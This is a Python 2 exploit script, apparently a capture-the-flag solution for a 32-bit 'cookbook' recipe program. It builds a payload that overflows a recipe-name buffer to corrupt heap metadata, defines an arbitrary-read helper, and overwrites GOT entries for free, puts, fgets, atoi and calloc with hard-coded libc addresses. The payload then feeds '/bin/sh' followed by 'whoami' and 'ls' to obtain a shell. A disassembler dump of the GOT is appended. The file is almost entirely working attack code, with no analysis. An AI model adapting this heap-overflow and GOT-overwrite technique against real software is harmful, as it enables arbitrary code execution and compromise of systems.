#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

 

# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)
  return ret


# --------------------------------------------------------------------------------------------------
def arbitrary_read(addr):
 	p  = 'c' + '\n'			# create recipe
	
	p += 'n' + '\n'			# new recipe

	p += 'a' + '\n'			# add ingredient
	p += 'tomato' + '\n'	# ingredient name
	p += '1' + '\n'			# ingredient quantity
	
	p += 'a' + '\n'			# add ingredient
	p += 'water' + '\n'		# ingredient name
	p += '1' + '\n'			# ingredient quantity
	
	p += 'g' + '\n'			# give name to recipe
	
	p += 'A'*(1036-140-4)		# fill
	p += 'B'*8				# heap meta

	p += struct.pack('<L', addr)           # rbp = 0x60120c     
	p += struct.pack('<L', 0x00)           # rbp = 0x60120c 

	p += 'C'*8				# heap meta

	p += struct.pack('<L', 0x01)           # rbp = 0x60120c 
	p += struct.pack('<L', 0x00)           # rbp = 0x60120c 

	p += 'D'*8	

	p += '\n'
	
	p += 'p' + '\n'
	
	p += 'q' + '\n'
	# now I can leak addres any address I want
	return p

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
	



	p  = 'ispo1234567890' + '\n'


	#p += arbitrary_read(0x0804D014)
	#p += arbitrary_read(0x0804D018)
	#p += arbitrary_read(0x0804D020)
	#p += arbitrary_read(0x0804D030)
	#p += arbitrary_read(0x0804D044)
	#p += arbitrary_read(0x0804D048)
	

	#p += arbitrary_read(0x0804A2CF)
	
#	print p

	p += 'g' + '\n'			# give cookbook name

	s = (1036+8+8)
	p += "%x\n" % s			# give size

	p += 'F'*(s-2) + '\n'			# give cookbook name


	# create ingredient
	p += 'a' + '\n'			# 
	p += 'n' + '\n'			# 
	p += 'g' + '\n'			# give cookbook name
	p += 'kyriakos' + '\n'			# give cookbook name
	p += 'q' + '\n'			# now TEMP_INGR points to next slot


	p += 'R' + '\n'			# remove cookbook

	# now there's a gap in slab allocator

	p += 'c' + '\n'			# create recipe	
	p += 'n' + '\n'			# new recipe

	p += 'a' + '\n'			# add ingredient
	p += 'olive oil' + '\n'		# ingredient name
	p += '1337' + '\n'			# ingredient quantity
	
	


# .rodata:0804A83F 73 61 76 65 64 21+aSaved db 'saved!',0 

#.rodata:0804A99D 6E 69 63 65 00    aNice db 'nice',0


	p += 'g' + '\n'			# give name to recipe
	
	p += 'A'*(1036-140-4)		# fill
	p += 'B'*8				# heap meta

	p += struct.pack('<L', 0x41414141) # 
	p += struct.pack('<L', 0x0804D094) # address of ingrlist
	p += 'C'*8				# heap meta
	p += '\n'


	#  X_804D098 = NULL
	# add ingre to give a value to X


	p += 'a' + '\n'			# add ingredient
	p += 'olive oil' + '\n'		# ingredient name
	p += '1337' + '\n'			# ingredient quantity


	# now X has a value -> don't crash

	# overflow again

	# X+4 = TEMP which points to here:

	
	p += 'g' + '\n'			# give name to recipe
	
	p += 'A'*(1036-140-4)		# fill
	p += '\x00'*7 + '\x11'		# heap meta

	p += struct.pack('<L', 0x0804A83F-8) # 
	p += struct.pack('<L', 0x0804D098) # address of X
	p += '\x00'*4 + '\x99'+ '\x00'*3		# heap meta
	
	p += struct.pack('<L', 0x0804E008-0) # 
	p += struct.pack('<L', 0x0804CFF8) 	# 			!!!!! CHANGE IT
	p += '\x00'*7 + '\x11'		# heap meta

	#p += struct.pack('<L', 0x11223344) # 
	#p += struct.pack('<L', 0x11223344) # address of X
	#p += '\x00'*7 + '\x11'		# heap meta

	p += '\n'
	

	p += 'r' + '\n'
	p += '567890\x00' + '\n'


	# go back
	p += 'q' + '\n'


	p += 'e' + '\n'
	p += 'lemon\x00' + '\n'
	p += 'e' + '\n'
	p += 'water\x00' + '\n'
	

	p += 'a' + '\n'
	p += 'g' + '\n'
	p += 'A'*12

	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0xF7F44DA0) # strcspn
	p += struct.pack('<L', 0xF7E7B070) # free
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0xF7E68220) # fgets

	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0xF7E69D00) # puts
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0) 

	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0) 
	p += struct.pack('<L', 0xf7e43360) # atoi
	p += struct.pack('<L', 0xF7E7B3D0) # calloc
	# Padding goes here
	
	p += '\n'



	p += 's' + '\n'
	p += '/bin/sh' + '\n'


	p += '\n\nwhoami\nls\n' + '\n'

	
	print p


	
'''

.got.plt:0804D00C 90 31 F4 F7       off_804D00C dd offset unk_F7F43190      ; DATA XREF: _strcmpr
.got.plt:0804D010 D0 1B E5 F7       off_804D010 dd offset unk_F7E51BD0      ; DATA XREF: _printfr
.got.plt:0804D014 A0 4D F4 F7       off_804D014 dd offset unk_F7F44DA0      ; DATA XREF: _strcspnr
.got.plt:0804D018 70 B0 E7 F7       off_804D018 dd offset unk_F7E7B070      ; DATA XREF: _freer
.got.plt:0804D01C 00 4F F3 F7       off_804D01C dd offset unk_F7F34F00      ; DATA XREF: _memcpyr
.got.plt:0804D020 20 82 E6 F7       off_804D020 dd offset unk_F7E68220      ; DATA XREF: _fgetsr

.got.plt:0804D024 66 85 04 08       off_804D024 dd offset word_8048566      ; DATA XREF: _alarmr
.got.plt:0804D028 76 85 04 08       off_804D028 dd offset word_8048576      ; DATA XREF: ___stack_chk_failr
.got.plt:0804D02C E0 AA E7 F7       off_804D02C dd offset unk_F7E7AAE0      ; DATA XREF: _mallocr
.got.plt:0804D030 00 9D E6 F7       off_804D030 dd offset unk_F7E69D00      ; DATA XREF: _putsr
.got.plt:0804D034 A6 85 04 08       off_804D034 dd offset word_80485A6      ; DATA XREF: ___gmon_start__r
.got.plt:0804D038 50 78 E3 F7       off_804D038 dd offset unk_F7E37850      ; DATA XREF: _strtoulr

.got.plt:0804D03C 70 E9 E1 F7       off_804D03C dd offset unk_F7E1E970      ; DATA XREF: ___libc_start_mainr
.got.plt:0804D040 F0 A3 E6 F7       off_804D040 dd offset unk_F7E6A3F0      ; DATA XREF: _setvbufr
.got.plt:0804D044 E6 85 04 08       off_804D044 dd offset word_80485E6      ; DATA XREF: _atoir
.got.plt:0804D048 D0 B3 E7 F7       off_804D048 dd offset unk_F7E7B3D0      ; DATA XREF: _callocr


free, puts, fgets _strcspn calloc, atoi
'''

